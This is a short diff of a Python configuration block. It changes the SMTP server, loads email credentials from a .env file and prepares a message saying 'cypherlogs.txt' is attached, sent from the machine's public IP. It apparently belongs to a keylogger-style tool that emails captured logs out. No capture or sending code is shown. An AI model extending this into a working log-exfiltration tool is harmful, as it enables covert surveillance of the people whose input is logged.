@@ -18,7 +18,7 @@ dotenv.load_dotenv(".env")
 
 '''------------------------------- CONFIGURATION SETTINGS BELOW --------------------------------'''
 
-SMTP_SERVER = "smtp.mail.yahoo.com"             # Specify SMTP server here.
+SMTP_SERVER = "smtp.example.com"                # Specify SMTP server here.
 TO_ADDR = os.environ["EMAIL"]                   # Get recipient email address from .env file.
 FROM_ADDR = os.environ["EMAIL"]                 # Get sender email address from .env file.
 PASSWORD = os.environ["PASSWORD"]               # Get email account password from .env file.
@@ -31,6 +31,3 @@ CONTENT = '''
 See cypherlogs.txt attached.
 
 Sent from {}.'''.format(PUBLIC_IP)
-
-
-
